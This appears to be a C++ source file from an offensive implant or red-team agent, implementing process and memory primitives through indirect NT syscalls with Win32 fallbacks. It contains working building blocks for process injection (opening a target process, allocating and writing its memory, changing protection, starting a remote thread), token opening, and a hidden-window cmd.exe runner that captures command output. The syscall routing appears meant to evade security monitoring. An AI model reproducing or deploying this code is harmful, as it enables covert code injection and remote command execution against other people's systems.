#include "core/system.hpp"

namespace System::Process
{
	HANDLE ProcessCreate(
		Procs::PPROCS 	pProcs,
		LPCWSTR 		lpApplicationName,
		DWORD 			dwDesiredAccess,
		HANDLE 			hParentProcess,
		HANDLE			hToken
	) {
		HANDLE hProcess;
		OBJECT_ATTRIBUTES objAttr;
		UNICODE_STRING uniAppName;

		CallSysInvoke(
			&pProcs->sysRtlInitUnicodeString,
			pProcs->lpRtlInitUnicodeString,
			&uniAppName,
			lpApplicationName
		);
		InitializeObjectAttributes(&objAttr, &uniAppName, 0, nullptr, nullptr);

		// Create a new process.
		NTSTATUS status = CallSysInvoke(
			&pProcs->sysNtCreateProcess,
			pProcs->lpNtCreateProcess,
			&hProcess,
			dwDesiredAccess,
			&objAttr,
			hParentProcess,
			FALSE,
			nullptr,
			nullptr,
			hToken
		);
		if (status != STATUS_SUCCESS)
		{
			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			RtlZeroMemory(&si, sizeof(si));
			si.cb = sizeof(si);

			if (CreateProcessW(
				lpApplicationName,
				nullptr,
				nullptr,
				nullptr,
				FALSE,
				0,
				nullptr,
				nullptr,
				&si,
				&pi
			)) {
				return pi.hProcess;
			}
			else
			{
				return nullptr;
			}
		}

		return hProcess;
	}

	HANDLE ProcessOpen(
		Procs::PPROCS pProcs,
		DWORD dwProcessID,
		DWORD dwDesiredAccess
	) {
		HANDLE hProcess;
		CLIENT_ID clientId;
		clientId.UniqueProcess = reinterpret_cast<HANDLE>(dwProcessID);
		clientId.UniqueThread = nullptr;
		static OBJECT_ATTRIBUTES oa = { sizeof(oa) };
		
		NTSTATUS status = CallSysInvoke(
			&pProcs->sysNtOpenProcess,
			pProcs->lpNtOpenProcess,
			&hProcess,
			(ULONG)dwDesiredAccess,
			&oa,
			&clientId
		);
		if (status != STATUS_SUCCESS)
		{
			hProcess = OpenProcess(
				dwDesiredAccess,
				FALSE,
				dwProcessID
			);
		}

		return hProcess;
	}

	HANDLE ProcessTokenOpen(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        DWORD           dwDesiredAccess
    ) {
		HANDLE hToken;

		NTSTATUS status = CallSysInvoke(
			&pProcs->sysNtOpenProcessToken,
			pProcs->lpNtOpenProcessToken,
			hProcess,
			dwDesiredAccess,
			&hToken
		);
		if (status != STATUS_SUCCESS)
		{
			if (!OpenProcessToken(
				hProcess,
				dwDesiredAccess,
				&hToken
			)) {
				return nullptr;
			}
		}

		return hToken;
	}

	BOOL ProcessTerminate(
        Procs::PPROCS   pProcs,
        HANDLE          hProcess,
        NTSTATUS        ntStatus
    ) {
		NTSTATUS status = CallSysInvoke(
			&pProcs->sysNtTerminateProcess,
			pProcs->lpNtTerminateProcess,
			hProcess,
			ntStatus
		);
		if (status != STATUS_SUCCESS)
		{
			return TerminateProcess(hProcess, EXIT_SUCCESS);
		}
		return TRUE;
	}

	PVOID VirtualMemoryAllocate(
		Procs::PPROCS 	pProcs,
		HANDLE 			hProcess,
		SIZE_T 			dwSize,
		DWORD 			dwAllocationType,
		DWORD 			dwProtect
	) {
        PVOID pBaseAddr;

		NTSTATUS status = CallSysInvoke(
			&pProcs->sysNtAllocateVirtualMemory,
			pProcs->lpNtAllocateVirtualMemory,
			hProcess,
            &pBaseAddr,
            0,
            &dwSize,
            dwAllocationType,
            dwProtect
		);
		if (status != STATUS_SUCCESS)
		{
			pBaseAddr = VirtualAllocEx(
                hProcess,
                nullptr,
                dwSize,
                dwAllocationType,
                dwProtect
            );
		}

        return pBaseAddr;
    }

	BOOL VirtualMemoryWrite(
		Procs::PPROCS 	pProcs,
		HANDLE 			hProcess,
		PVOID 			pBaseAddr,
		PVOID 			pBuffer,
		SIZE_T			dwBufferSize,
		PSIZE_T 		lpNumberOfBytesWritten
	) {
		NTSTATUS status = CallSysInvoke(
			&pProcs->sysNtWriteVirtualMemory,
			pProcs->lpNtWriteVirtualMemory,
			hProcess,
			pBaseAddr,
			pBuffer,
			dwBufferSize,
			lpNumberOfBytesWritten
		);
		if (status != STATUS_SUCCESS)
		{
			if (!WriteProcessMemory(
				hProcess,
				pBaseAddr,
				pBuffer,
				dwBufferSize,
				lpNumberOfBytesWritten
			)) {
				return FALSE;
			}
		}
		return TRUE;
	}

	BOOL VirtualMemoryProtect(
		Procs::PPROCS 	pProcs,
		HANDLE 			hProcess,
		PVOID* 			pBaseAddr,
		PSIZE_T 		pdwSize,
		DWORD 			dwProtect,
		PDWORD			pdwOldProtect
	) {
		NTSTATUS status = CallSysInvoke(
			&pProcs->sysNtProtectVirtualMemory,
			pProcs->lpNtProtectVirtualMemory,
			hProcess,
			pBaseAddr,
			pdwSize,
			dwProtect,
			pdwOldProtect
		);
		if (status != STATUS_SUCCESS)
		{
			if (!VirtualProtectEx(
				hProcess,
				pBaseAddr,
				*pdwSize,
				dwProtect,
				pdwOldProtect
			)) {
				return FALSE;
			}
		}
		return TRUE;
	}

	BOOL VirtualMemoryFree(
		Procs::PPROCS 	pProcs,
		HANDLE 			hProcess,
		PVOID* 			pBaseAddr,
		PSIZE_T 		pdwSize,
		DWORD 			dwFreeType
	) {
		NTSTATUS status = CallSysInvoke(
			&pProcs->sysNtFreeVirtualMemory,
			pProcs->lpNtFreeVirtualMemory,
			hProcess,
			pBaseAddr,
			pdwSize,
			(ULONG)dwFreeType
		);
		if (status != STATUS_SUCCESS)
		{
			return VirtualFree(
				pBaseAddr,
				*pdwSize,
				dwFreeType
			);
		}
	
		return TRUE;
	}

	HANDLE RemoteThreadCreate(
        Procs::PPROCS 			pProcs,
		HANDLE 					hProcess,
		LPTHREAD_START_ROUTINE 	lpThreadStartRoutineAddr,
		PVOID					pArgument
    ) {
		HANDLE hThread;
            
		NTSTATUS status = CallSysInvoke(
			&pProcs->sysNtCreateThreadEx,
			pProcs->lpNtCreateThreadEx,
			&hThread,
			THREAD_ALL_ACCESS,
			nullptr,
			hProcess,
			lpThreadStartRoutineAddr,
			pArgument,
			0,
			0,
			0,
			0,
			nullptr
		);
		if (status != STATUS_SUCCESS)
		{
			hThread = CreateRemoteThreadEx(
				hProcess,
				nullptr,
				0,
				lpThreadStartRoutineAddr,
				pArgument,
				0,
				nullptr,
				nullptr
			);
		}

		return hThread;
	}

	std::wstring ExecuteCmd(Procs::PPROCS pProcs, const std::wstring& wCmd)
	{
		std::wstring result;

		SECURITY_ATTRIBUTES sa;
		STARTUPINFOW si;
		PROCESS_INFORMATION pi;
		HANDLE hReadPipe = NULL;
		HANDLE hWritePipe = NULL;
		BOOL bResults = FALSE;

		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.bInheritHandle = TRUE;
		sa.lpSecurityDescriptor = NULL;

		if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
		{
			return L"";
		}

		if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0))
		{
			return L"";
		}

		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		ZeroMemory(&si, sizeof(STARTUPINFOW));

		si.cb = sizeof(STARTUPINFOW);
		si.hStdError = hWritePipe;
		si.hStdOutput = hWritePipe;
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		si.wShowWindow = SW_HIDE;

		// Set application name (full path)
		WCHAR system32Path[MAX_PATH];
		GetSystemDirectoryW(system32Path, MAX_PATH);
		std::wstring wSystem32Path = std::wstring(system32Path);
		const std::wstring applicationName = wSystem32Path + L"\\cmd.exe";
		// const std::wstring applicationName = wSystem32Path + L"\\WindowsPowerShell\\v1.0\powershell.exe";

		// Set command
		std::wstring commandLine = L"/C " + wCmd;
		// std::wstring commandLine = L"-c " + cmd;

		bResults = CreateProcessW(
			applicationName.c_str(),
			&commandLine[0],
			NULL,
			NULL,
			TRUE,
			0,
			NULL,
			NULL,
			&si,
			&pi
		);
		if (!bResults)
		{
			return L"";
		}

		// Read stdout
		DWORD dwRead;
		CHAR chBuf[4096];
		
		CloseHandle(hWritePipe);

		while (ReadFile(hReadPipe, chBuf, 4095, &dwRead, NULL) && dwRead > 0)
		{
			chBuf[dwRead] = '\0';
			result += std::wstring(chBuf, chBuf + dwRead);
		}

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hReadPipe);

		return result;
	}

	BOOL ExecuteFile(Procs::PPROCS pProcs, const std::wstring& wFilePath)
	{
		HANDLE hProcess = System::Process::ProcessCreate(
			pProcs,
			wFilePath.c_str(),
			PROCESS_ALL_ACCESS,
			GetCurrentProcess(),
			nullptr
		);
		if (!hProcess)
		{
			return FALSE;
		}

		CallSysInvoke(
			&pProcs->sysNtWaitForSingleObject,
			pProcs->lpNtWaitForSingleObject,
			hProcess,
			FALSE,
			nullptr
		);

		CallSysInvoke(
			&pProcs->sysNtClose,
			pProcs->lpNtClose,
			hProcess
		);

		return TRUE;
	}
}
